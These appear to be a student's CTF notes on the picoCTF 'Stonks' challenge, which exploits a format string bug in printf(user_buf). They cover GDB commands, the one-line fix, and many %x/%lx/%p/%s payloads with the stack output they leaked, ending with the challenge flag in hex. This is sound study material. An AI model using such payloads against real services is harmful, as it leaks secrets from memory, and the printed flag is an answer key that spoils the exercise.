# Stonks

All about format string vulnerability. [https://owasp.org/www-community/attacks/Format_string_attack]

Some kind of `printf` could leak other data in the *stack*. We try to get it. (Note that unlikely to do things to the heap for this question)

## Details of format string vulnerability

### Overview

Normally we use `print()` and `"something to format {}".format()` in Python to print output to console. We also have `cout << some_var;` in C++ to print output. These are mostly safe ... should be.

But the format string like `'Fixed part + format string ' %d %x` and `printf` can be abused and could leak infomation about the program or simply crashing the program.

### More details

#### Program structure

#### Format string

## Actual question

Run `nc mercury.picoctf.net 33411` to connect to that binary.

Enter `1` to make them run the function which contains the key in a variable.

Overall flow:

```text
1. Enter 1 for the first prompt (buy_stonks())
2. Run code: Put API KEY in api_buf
3. Create linked list + generate random strings ->
Prompt for user input
4. Use the format string vulnerability to obtain the content in api_buf
```

Related codes extract:

```c
int buy_stonks(Portfolio *p) {
    char api_buf[FLAG_BUFFER]; // target
    FILE *f = fopen("api","r"); // read from the file api
    fgets(api_buf, FLAG_BUFFER, f);

    // some local variables + linked list generation
    // ...

    // ask user to input API key
    char *user_buf = malloc(300 + 1); // Note: In the heap
    printf("What is your API token?\n");
    scanf("%300s", user_buf); // Input our payload here
    // Note: Buffer overflow won't work here as anything out of range are ignored
    printf("Buying stonks with token:\n");
    printf(user_buf); // Execute the payload
    // Note: The parsing will stop at the point when a space is found

    // end function
}
```

By the way warning message from compiler: [https://www.onlinegdb.com/]

```c
main.c: In function ‘buy_stonks’:
main.c:93:2: warning: format not a string literal and no format arguments [-Wformat-security]
   93 |  printf(user_buf);
      |  ^~~~~~
```

### Close the loophole

Just simply change that line:

```c
    printf("What is your API token?\n");
    scanf("%300s", user_buf);
    printf("Buying stonks with token:\n");
    // printf(user_buf); // BAD
    printf("%s", user_buf); // Fixed!
```

### Some commands used in GDB

```bash
gcc vuln.c -Wall -g-o vuln # -g flag to include debug symbol for gdb
```

```gdb
info frame

print <variable_name or &variable_address> # print value or address

x <address> # to inspect what is inside this address

x/40x $sp # print 40 * 32-bit data (as integer) from stack pointer

where # show currently where am I

# ----------------------------------

# From low leveling learning GDB 101 video
layout next  # show source code and assembly code together

nexti  # next (assembly) instruction

refresh  # refresh current screen - use this when current visual output seems bugged

x/i $pc # examine instruction at program counter. Very useful to check what assembly code is running after crash

```

Addresses start with 0x7ffff are probably stack
Addresses start with 0x55555555 are probably for heap

### Follow-up questions

1. Can I use `%s` in the payload to display the content? (so that I don't need to do the conversion myself) If I can't, what change do I need to make in the program so that I can use `%s` to show the `api_buf`?

2. Explain why no "data loss" for the flag data (api_buf) when you use both `%x` and `%lx` as payload IN THE ACTUAL SERVER (64-bit program). Note that you lose 4 bytes in the stack each time you `printf("%x")` instead of `printf(%lx)`. (On local I lose half of the flag too)

Extract from actual test:

```bash
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_%016lx_
Buying stonks with token:

Breakpoint 1, buy_stonks (p=0x555555559260) at vuln_edited.c:94
94      printf(user_buf);
(gdb) x /40x $sp
0x7fffffffddd0: 0x00000d68 0x00000000 0x55559260 0x00005555
0x7fffffffdde0: 0x6f636970 0x7b465443 0x68636167 0x53414269
0x7fffffffddf0: 0x454b5f53 0x635f574b 0x694b7461 0x345f7373
0x7fffffffde00: 0x39363032 0x00000a7d 0x00000001 0x00000000
0x7fffffffde10: 0x0000000a 0x00000000 0x55558098 0x00005555
0x7fffffffde20: 0x55556151 0x00005555 0xf7fab2a0 0x00007fff
0x7fffffffde30: 0x00000000 0x00000000 0xf7e70649 0x00007fff
0x7fffffffde40: 0xf7faf760 0x00007fff 0xf7e70a33 0x00007fff
0x7fffffffde50: 0x00000014 0x00000000 0xf7faf760 0x00007fff
0x7fffffffde60: 0x5555a500 0x00005555 0x5555a4e0 0x00005555
(gdb) n
00007ffff7faf7e3_00007ffff7fb08c0_00007ffff7ede3b4_00007ffff7fb5500_0000000000000000_0000000000000d68_0000555555559260_7b4654436f636970_5341426968636167_635f574b454b5f53_345f7373694b7461_00000a7d39363032_0000000000000001_000000000000000a_0000555555558098_0000555555556151_00007ffff7fab2a0_0000000000000000_00007ffff7e70649_00007ffff7faf760_00007ffff7e70a33_0000000000000014_00007ffff7faf760_000055555555a500_000055555555a4e0_0000000200000000_00007fffffffdde0_0000555555559280_00000000ffffdfa0_00007fffffffdec0_000055555555564e_00007fffffffdfa8_0000000155555120_00000001ffffdfa0_0000555555559260_0000555555555690_00007ffff7e1809b_0000000000000000_00007fffffffdfa8_0000000100040000_

# Note that 0000000000000000_0000000000000d68 are those data in 0x7fffffffdddX
```

```bash
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x_
Buying stonks with token:

Breakpoint 1, buy_stonks (p=0x555555559260) at vuln_edited.c:94
94      printf(user_buf);
(gdb) x /40x $sp
0x7fffffffddd0: 0x00000d68 0x00000000 0x55559260 0x00005555
0x7fffffffdde0: 0x6f636970 0x7b465443 0x68636167 0x53414269
0x7fffffffddf0: 0x454b5f53 0x635f574b 0x694b7461 0x345f7373
0x7fffffffde00: 0x39363032 0x00000a7d 0x00000001 0x00000000
0x7fffffffde10: 0x0000000a 0x00000000 0x55558098 0x00005555
0x7fffffffde20: 0x55556151 0x00005555 0xf7fab2a0 0x00007fff
0x7fffffffde30: 0x00000000 0x00000000 0xf7e70649 0x00007fff
0x7fffffffde40: 0xf7faf760 0x00007fff 0xf7e70a33 0x00007fff
0x7fffffffde50: 0x00000014 0x00000000 0xf7faf760 0x00007fff
0x7fffffffde60: 0x5555a5c0 0x00005555 0x5555a5a0 0x00005555
(gdb) n
f7faf7e3_f7fb08c0_f7ede3b4_f7fb5500_00000000_00000d68_55559260_6f636970_68636167_454b5f53_694b7461_39363032_00000001_0000000a_55558098_55556151_f7fab2a0_00000000_f7e70649_f7faf760_f7e70a33_00000014_f7faf760_5555a5c0_5555a5a0_00000000_ffffdde0_55559280_ffffdfa0_ffffdec0_5555564e_ffffdfa8_55555120_ffffdfa0_55559260_55555690_f7e1809b_00000000_ffffdfa8_00040000_

# We lose 5th to 8th byte and 12th - 16th byte when we use %x this time... But not for the flag

```

%p_%p_%p_%p_%p_%p_%p_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_

%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%x_%x_%x_

aaaaaaa_%p_%p_%p_%p_%p_%p_%p_%c_%c_%c_%s_%x_bbbbbbbbbb
aaaaaaa_%p_%p_%p_%p_%p_%p_%p_!!!_%c%c%c%c%c%c%c%c%c_!!!_%x_%x_bbbbbbbbbb

aaaaaaa_%p_%p_%p_%p_%p_%p_%p_!!!_%x_!!!_%x_%x_bbbbbbbbbb

aaaaaaa_%p_%p_%p_%p_%p_%p_%p_!!!_%p_!!!_%x_%x_bbbbbbbbbb

aaaaaaa_%p_%p_%p_%p_%p_%p_%p_!!!_%s_!!!_bbbbbb
aaaaaaa_%p_%p_%p_%p_%p_%p_%p_!!!_%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c_!!!_bbbbbb

========
My input
%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_

40 %x

My output

88e8410_804b000_80489c3_f7f1cd80_ffffffff_1_88e6160_f7f2a110_f7f1cdc7_0_88e7180_5_88e83f0_88e8410_6f636970_7b465443_306c5f49_345f7435_6d5f6c6c_306d5f79_5f79336e_63343261_36613431_ffbf007d_f7f57af8_f7f2a440_114f5000_1_0_f7db9ce9_f7f2b0c0_f7f1c5c0_f7f1c000_ffbfa5c8_f7daa68d_f7f1c5c0_8048eca_ffbfa5d4_0_f7f3ef09_

=====================================

My input:
%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_

My output:
92033b0_804b000_80489c3_f7f68d80_ffffffff_1_9201160_f7f76110_f7f68dc7_0_9202180_3_9203390_92033b0_6f636970_7b465443_306c5f49_345f7435_6d5f6c6c_306d5f79_5f79336e_63343261_36613431_ffe1007d_f7fa3af8_f7f76440_896e8900_1_0_f7e05ce9_f7f770c0_f7f685c0_f7f68000_ffe1ec08_f7df668d_f7f685c0_8048eca_ffe1ec14_0_f7f8af09_804b000_f7f68000_f7f68e20_ffe1ec48_f7f90d50_f7f69890_896e8900_f7f68000_804b000_ffe1ec48_8048c86_9201160_ffe1ec34_ffe1ec48_8048be9_f7f683fc_0_ffe1ecfc_ffe1ecf4_1_

=====================================

So the flag is:
6f636970_7b465443_306c5f49_345f7435_6d5f6c6c_306d5f79_5f79336e_63343261_36613431

%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%s

%lx_%lx_%lx_%lx_%lx_%lx_%s

5 %lx, each row 2 lx

%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%s
